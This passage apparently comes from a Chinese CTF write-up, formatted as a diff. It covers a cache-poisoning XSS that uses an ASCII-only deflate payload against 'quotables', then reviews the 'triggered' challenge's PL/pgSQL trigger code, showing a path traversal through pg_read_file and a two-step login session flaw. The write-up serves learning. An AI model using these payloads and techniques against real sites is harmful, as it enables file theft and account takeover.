@@ -1,0 +1,188 @@
+    > GET /api/quote/babead1b-05df-45a8-8c39-c04212b52bba HTTP/1.1
+    > Host: quotables.pwni.ng:1337
+    > User-Agent: curl/7.54.0
+    > Accept: */*
+    >
+    * HTTP 1.0, assume close after body
+> Content-Encoding
+> 是一个实体消息首部，用于对特定媒体类型的数据进行压缩。当这个首部出现的时候，它的值表示消息主体进行了何种方式的内容编码转换。这个消息首部用来告知客户端应该怎样解码才能获取在
+> Content-Type 中标示的媒体类型内容。
+例如如下：
+    from flask import Flask,make_response
+    import zlib
+    app = Flask(__name__) 
+    @app.route('/')  
+    def hello_world():  
+        resp = make_response()
+        resp.headers['Content-Encoding'] = 'deflate'
+        resp.set_data(zlib.compress(b''))
+        resp.headers['Content-Length'] = resp.content_length
+        return resp
+    if __name__ == '__main__':
+        app.run(debug=False)
+用curl请求，看到的是乱码：
+    ➜  ~ curl  -v 127.0.0.1:5000
+    * Rebuilt URL to: 127.0.0.1:5000/
+    *   Trying 127.0.0.1...
+    * TCP_NODELAY set
+    * Connected to 127.0.0.1 (127.0.0.1) port 5000 (#0)
+    > GET / HTTP/1.1
+    > Host: 127.0.0.1:5000
+    > User-Agent: curl/7.54.0
+    > Accept: */*
+    >
+    * HTTP 1.0, assume close after body
+> A deflate compressor that emits compressed data that is in the [A-Za-z0-9]
+> ASCII byte range.
+    # just using ascii-zip
+    wow = 'D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4'
+这样就可以伪造任意响应了，exp给的payload被浏览器解码之后如下图所示：
+这就样就利用缓存构造了一个存在xss漏洞的页面，把这个链接发给管理员，就可以随意xss了。
+## 0x3 triggered
+这是个代码审计题目，但是有毒的是题目所有的逻辑都是sql语句实现的，其中包括 HTTP
+请求包解析，和业务逻辑处理，全是用触发器来依次调用的。为了让大家可以看到这个好玩的题目，我还把这个题目传到了github上，方便大家学习
+代码基本可以分为两部分，前800行，主要负责http请求的解析，后面800行主要负责业务逻辑，来生成响应。
+### 目录穿越漏洞
+在web.request 表上有这样的一个触发器用来处理静态资源
+    CREATE TRIGGER route_static
+      BEFORE INSERT
+      ON web.request
+      FOR EACH ROW
+      WHEN (substring(NEW.path, 1, 8) = '/static/')
+      EXECUTE PROCEDURE web.handle_static();
+跟一下 `handle_static` 的代码如下：
+    CREATE FUNCTION web.handle_static() RETURNS trigger AS $$
+    BEGIN
+      PERFORM web.serve_static(NEW.uid, substring(NEW.path, 9));
+      RETURN NEW;
+    END;
+    $$ LANGUAGE plpgsql;
+    CREATE FUNCTION web.serve_static(uid uuid, path text) RETURNS void AS $$
+    DECLARE
+      dot_parts text[];
+    BEGIN
+      SELECT
+        regexp_split_to_array(path, '\.')
+      INTO dot_parts;
+      INSERT INTO web.response_header (
+        request_uid,
+        key,
+        value
+      )
+      SELECT
+        uid,
+        'Content-Type',
+        mime_type
+      FROM
+        web.mime_type
+      WHERE
+        extension = dot_parts[array_length(dot_parts, 1)];
+      INSERT INTO web.response (
+        request_uid,
+        status,
+        status_text,
+        body
+      ) VALUES (
+        uid,
+        200,
+        'Ok',
+        pg_read_file('triggered/static/' || path)
+      );
+    END;
+    $$ LANGUAGE plpgsql;
+这里直接使用了 `pg_read_file('triggered/static/' || path)`， 显然可以任意文件读取。
+本地验证：
+但是不知道为啥在服务器端却不能成功，一直返回 500，具体原因还不太清楚。
+### session和cookie的管理
+这个题目有个很让人怀疑的地方就是他的登录流程，是分两步的，先输入用户名，生成cookie和session，然后再输入密码，修改session为登录状态,直接看代码就明白了。
+    CREATE FUNCTION web.handle_post_login() RETURNS TRIGGER AS $$
+    DECLARE
+      form_username text;
+      session_uid uuid;
+      form_user_uid uuid;
+      context jsonb;
+    BEGIN
+      SELECT
+        web.get_form(NEW.uid, 'username')
+      INTO form_username;
+      SELECT
+        web.get_cookie(NEW.uid, 'session')::uuid
+      INTO session_uid;   -- 查询出来session id
+      SELECT
+        uid
+      FROM
+        web.user
+      WHERE
+        username = form_username
+      INTO form_user_uid;   -- 查询出来用户id 
+      IF form_user_uid IS NOT NULL
+      THEN
+        INSERT INTO web.session (
+          uid,
+          user_uid,
+          logged_in
+        ) VALUES (
+          COALESCE(session_uid, uuid_generate_v4()),
+          form_user_uid,
+          FALSE
+        )
+        ON CONFLICT (uid)
+          DO UPDATE
+          SET
+            user_uid = form_user_uid,
+            logged_in = FALSE
+        RETURNING uid
+        INTO session_uid;
+        PERFORM web.set_cookie(NEW.uid, 'session', session_uid::text);
+        PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
+      ELSE
+        PERFORM web.respond_with_redirect(NEW.uid, '/login');
+      END IF;
+      RETURN NEW;
+    END;
+    $$ LANGUAGE plpgsql;
+    ---------- GET /login/password
+    CREATE FUNCTION web.handle_get_login_password() RETURNS TRIGGER AS $$
+    DECLARE
+      session_uid uuid;
+      logged_in boolean;
+      username text;
+      context jsonb;
+    BEGIN
+      SELECT
+        web.get_cookie(NEW.uid, 'session')::uuid
+      INTO session_uid;
+      IF session_uid IS NULL
+      THEN
+        PERFORM web.respond_with_redirect(NEW.uid, '/login');
+        RETURN NEW;
+      END IF;
+      SELECT
+        session.logged_in,
+        usr.username
+      FROM
+        web.session session
+          INNER JOIN web.user usr
+            ON usr.uid = session.user_uid
+      WHERE
+        session.uid = session_uid
+      INTO logged_in, username;
+      IF logged_in
+      THEN
+        PERFORM web.respond_with_redirect(NEW.uid, '/login');
+        RETURN NEW;
+      END IF;
+      SELECT
+        web.get_base_context(NEW.uid)
+          || jsonb_build_object('username', username)
+      INTO context;
+      PERFORM web.respond_with_template(NEW.uid, 'login-password.html', context);
+      RETURN NEW;
+    END;
+    $$ LANGUAGE plpgsql;
+    CREATE FUNCTION web.handle_post_login_password() RETURNS TRIGGER AS $$
+    DECLARE
+      form_password text;
+      session_uid uuid;
+      success boolean;
+    BEGIN
